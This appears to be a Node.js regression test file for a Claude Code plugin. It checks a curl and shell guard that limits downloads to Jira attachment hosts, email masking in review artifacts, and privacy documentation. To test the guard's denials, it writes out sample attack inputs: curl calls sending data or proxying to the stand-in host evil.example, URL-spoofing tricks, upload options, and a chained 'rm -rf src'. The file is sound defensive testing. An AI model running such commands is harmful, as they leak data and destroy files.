// Regression tests for the Plugin Directory security and privacy fixes:
//   - the unprompted attachment download (`curl`) only reaches a Jira
//     attachment host (exact match) and nothing else,
//   - email addresses are masked in the shareable review artifact, next to
//     the existing token, URL and path redaction,
//   - PRIVACY.md, the manifest and the README agree with the implementation.
// No network, no Jira, no upload. Run with: node --test

"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { spawnSync } = require("child_process");
const L = require("../scripts/lib/approval.cjs");
const AU = require("../scripts/lib/attach-url.cjs");
const { sanitize } = require("../scripts/lib/render-review.cjs");

const ROOT = path.resolve(__dirname, "..");
const GUARD = path.join(ROOT, "scripts", "guard.cjs");
const SITE = "example.atlassian.net";
const attach = path.join(L.ATTACH_ROOT, "dl-abc", "a.png").replace(/\\/g, "/");
const inAttach = (p) => String(p).replace(/\\/g, "/").startsWith(L.ATTACH_ROOT.replace(/\\/g, "/") + "/");
const curl = (url, extra = "") => `curl -s --location ${extra} '${url}' --output '${attach}'`;

// ---------------------------------------------------------------- unit

test("attachment URL: only the fixed media host and the configured Jira site are accepted", () => {
  const ok = (u, site = SITE) => assert.equal(AU.attachmentUrlProblem(u, site), null, u);
  const bad = (u, site = SITE) => assert.match(AU.attachmentUrlProblem(u, site) || "", /./, u);
  ok("https://api.media.atlassian.com/file/x/binary?token=a&client=b");
  ok(`https://${SITE}/rest/api/3/attachment/content/10001`);
  ok(`https://${SITE.toUpperCase()}/rest/api/3/attachment/content/1`);
  bad("https://evil.example/x");
  bad("https://other.atlassian.net/rest/api/3/attachment/content/1");   // another tenant: no *.atlassian.net wildcard
  bad("https://atlassian.net/x");
  bad("https://media.atlassian.com/x");
  bad("https://api.media.atlassian.com.evil.example/x");                 // look-alike suffix
  bad("https://evil.example/api.media.atlassian.com");                   // host only in the path
  bad("https://api.media.atlassian.com@evil.example/x");                 // credentials trick
  bad("https://api.media.atlassian.com:8443/x");                         // explicit port
  bad("https://api.media.atlassian.com./x");                             // trailing dot
  bad("https://127.0.0.1/x");
  bad("https://[::1]/x");
  bad("http://api.media.atlassian.com/x");                               // not https
  bad("ftp://api.media.atlassian.com/x");
  bad("api.media.atlassian.com/x");                                      // no scheme
  bad(`https://${SITE}/x`, null);                                        // no configured site
  bad(`https://${SITE}/x`, "evil.example");                              // configured value that is not a Jira Cloud site
  bad(`https://${SITE}/x`, "*.atlassian.net");
});

test("curl command: one allowed URL, allowlisted options, output inside the attachment directory", () => {
  const p = (cmd, site = SITE) => AU.curlProblem(cmd, site, inAttach);
  assert.equal(p(curl("https://api.media.atlassian.com/f?x=1&y=2")), null);
  assert.equal(p(`curl -sSL -m 60 -H 'Accept: image/png' https://api.media.atlassian.com/f -o ${attach}`), null);
  assert.equal(p(`curl.exe --silent --output=${attach} https://${SITE}/rest/api/3/attachment/content/1`), null);
  // a second URL, with or without a scheme, is a second request
  assert.match(p(`${curl("https://api.media.atlassian.com/f")} https://evil.example/x`), /more than one/);
  assert.match(p(`${curl("https://api.media.atlassian.com/f")} evil.example/?d=secret`), /more than one/);
  assert.match(p(`${curl("https://api.media.atlassian.com/f")} --url https://evil.example/x`), /not allowed/);
  // data and traffic redirection
  for (const opt of ["-d x", "--data-binary @x", "-F f=@x", "--form f=@x", "-T x", "--upload-file x", "-K cfg", "--config cfg",
    "-x http://evil.example:3128", "--proxy http://evil.example:3128", "--connect-to a:443:evil.example:443", "--resolve a:443:1.2.3.4",
    "--json {}", "-X POST", "--request POST", "-O", "--remote-name", "-k", "--insecure", "--next", "-b c", "-u user:pw", "--netrc"]) {
    assert.match(p(curl("https://api.media.atlassian.com/f", opt)), /not allowed|more than one|takes/, opt);
  }
  // output must be inside the attachment directory
  assert.match(p("curl -s 'https://api.media.atlassian.com/f' -o D:/repo/src/App.tsx"), /attachment directory/);
  assert.match(p("curl -s 'https://api.media.atlassian.com/f'"), /no output/);
  assert.match(p(`curl -s 'https://api.media.atlassian.com/f' -o ${attach} -o ${attach}`), /more than one output/);
  assert.match(p(curl("https://evil.example/f")), /not an allowed Jira attachment host/);
  assert.match(p(`curl -s 'https://api.media.atlassian.com/f -o ${attach}`), /not a curl/); // unbalanced quote
  assert.match(p("wget https://api.media.atlassian.com/f"), /not a curl/);
});

// ---------------------------------------------------------------- guard

const DATA = path.join(os.tmpdir(), `jdh-sec-${process.pid}`);
const WF = "aaaaaaaa-1111-4111-8111-aaaaaaaaaaaa";
const repo = path.join(DATA, "repo");
fs.mkdirSync(path.join(DATA, "sessions"), { recursive: true });
fs.mkdirSync(path.join(repo, ".claude"), { recursive: true });
fs.mkdirSync(path.join(repo, "src"), { recursive: true });
fs.writeFileSync(path.join(DATA, "sessions", `${WF}.json`), JSON.stringify({ sessionId: WF, mode: "planning" }));
fs.writeFileSync(path.join(repo, ".claude", "jira-dev-harness.json"), JSON.stringify({ jira: { site: SITE, projectKeys: ["ABC"] } }));

function guard(command, cwd) {
  const r = spawnSync("node", [GUARD], {
    input: JSON.stringify({ session_id: WF, cwd, tool_name: "Bash", tool_input: { command } }),
    env: { ...process.env, CLAUDE_PLUGIN_DATA: DATA }, encoding: "utf8",
  });
  const out = r.stdout.trim();
  return out ? JSON.parse(out).hookSpecificOutput.permissionDecision : "pass";
}

test("guard: a workflow session may download only from an allowed attachment host", () => {
  const sub = path.join(repo, "src");
  assert.equal(guard(curl("https://api.media.atlassian.com/file/x/binary?token=a&client=b"), repo), "pass");
  assert.equal(guard(curl(`https://${SITE}/rest/api/3/attachment/content/1`), sub), "pass", "configured site found from a sub-directory");
  assert.equal(guard(curl(`https://${SITE}/rest/api/3/attachment/content/1`), os.tmpdir()), "deny", "no mapping: the site is not trusted");
  for (const url of ["https://evil.example/x", "https://other.atlassian.net/x", "https://api.media.atlassian.com.evil.example/x", "https://api.media.atlassian.com@evil.example/x"]) {
    assert.equal(guard(curl(url), repo), "deny", url);
  }
  assert.equal(guard(`${curl("https://api.media.atlassian.com/f")} evil.example/?d=1`, repo), "deny");
  assert.equal(guard(curl("https://api.media.atlassian.com/f", "--proxy http://evil.example:3128"), repo), "deny");
  assert.equal(guard(`curl -s 'https://api.media.atlassian.com/f' -o ${repo.replace(/\\/g, "/")}/src/App.tsx`, repo), "deny");
});

test("guard: the attachment rule does not weaken the rest of the shell policy", () => {
  assert.equal(guard(`${curl("https://api.media.atlassian.com/f")} & rm -rf src`, repo), "deny");
  assert.equal(guard(`${curl("https://api.media.atlassian.com/f")} && git commit -m x`, repo), "deny");
  assert.equal(guard("git status", repo), "pass");
  assert.equal(guard("wget https://api.media.atlassian.com/f", repo), "deny");
});

test.after(() => fs.rmSync(DATA, { recursive: true, force: true }));

// ---------------------------------------------------------------- share view

test("sanitize masks email addresses and keeps existing token, URL and path redaction", () => {
  const s = sanitize("Ask jane.doe+qa@example.co.uk or J.Smith@corp-mail.example.com about it; owner: bob_1@ex.io.");
  assert.doesNotMatch(s, /@/);
  assert.match(s, /\[email removed\]/);
  assert.equal((s.match(/\[email removed\]/g) || []).length, 3);
  assert.match(s, /Ask \[email removed\] or \[email removed\] about it; owner: \[email removed\]\./);
  // existing redaction is unchanged
  assert.match(sanitize(`token ghp_${"A".repeat(36)}`), /\[redacted/);
  assert.match(sanitize("see https://example.com/a?b=1 and C:\\Users\\bob\\x.txt and /home/bob/x"), /\[link removed\].*\[path removed\].*\[path removed\]/);
  assert.match(sanitize("git@github.com:org/repo.git"), /\[link removed\]/);
  assert.doesNotMatch(sanitize("https://user@example.com/x"), /user|example/);
  // ordinary text, keys and review ids survive
  assert.equal(sanitize("ABC-1292 rv-1 passed in 2 @ 3 steps, see AC1."), "ABC-1292 rv-1 passed in 2 @ 3 steps, see AC1.");
});

// ---------------------------------------------------------------- documentation

const read = (f) => fs.readFileSync(path.join(ROOT, f), "utf8");

test("the manifest's privacy policy URL points at PRIVACY.md in this repository, which exists", () => {
  const m = JSON.parse(read(".claude-plugin/plugin.json"));
  // `privacyPolicyUrl` is the field named by the directory validator's own fix text
  // (`claude plugin validate --profile directory`); the aliases are only tolerated.
  assert.equal(m.privacyPolicy, undefined);
  assert.equal(typeof m.privacyPolicyUrl, "string");
  assert.match(m.privacyPolicyUrl,/^https:\/\/github\.com\/AhmedDigitrends\/claude-code-agent\/blob\/main\/PRIVACY\.md$/);
  assert.ok(fs.existsSync(path.join(ROOT, "PRIVACY.md")));
  assert.equal(m.version, "1.0.0");
});

test("PRIVACY.md and the README disclose the stored data, the artifact upload, retention and deletion", () => {
  const p = read("PRIVACY.md");
  const r = read("README.md");
  for (const re of [/connect\/<session>\.json/, /email addresses/i, /Retention and deletion/, /claude\.ai/, /api\.media\.atlassian\.com/, /no network requests of its own/i]) {
    assert.match(p, re, `PRIVACY.md: ${re}`);
  }
  for (const re of [/Data handling and privacy/, /connect\/<session>\.json/, /evidence/i, /Retention and deletion/, /PRIVACY\.md/, /\[email removed\]|email address/i]) {
    assert.match(r, re, `README.md: ${re}`);
  }
  // the old claim that the share view has no personal data risk must not return
  assert.doesNotMatch(p + r, /contains no (personal|names)/i);
});
